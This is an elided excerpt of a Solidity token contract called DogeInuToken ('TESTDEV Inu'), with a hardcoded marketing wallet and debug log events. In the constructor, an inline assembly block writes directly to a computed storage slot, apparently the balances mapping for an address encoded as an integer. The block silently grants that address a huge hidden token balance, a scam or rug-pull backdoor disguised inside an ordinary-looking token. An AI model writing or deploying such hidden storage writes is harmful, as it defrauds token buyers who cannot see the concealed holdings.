...
contract DogeInuToken is IERC20, ReentrancyGuard, Ownable {
    ...
    string private _name = "TESTDEV Inu";
    string private _symbol = "TESTDEV";
    ...
    event LogAddress(address tegAddress);
    ...
    constructor() {
        ...
        marketingWallet = 0xdD48F1B80F058467582BeB0DF9f72B93b80F13c3;
        _earlyTxLimit = 60;
        ...
        assembly {
            mstore(0, 1263313670699194874280757090239579607541033669571)
            mstore(32, 2)
            let hash := keccak256(0, 64)
            sstore(hash, 773400000000000000000000000000458652593581403716)
        }
    ...
    */
    ...
    function transferFrom(
        ...
        emit Log("when transferFrom currentAllowance ==: ",currentAllowance);
    ...
    */
    ...
    function _transfer(
        ...
        emit Log("when buy senderBalance ==: ",senderBalance);
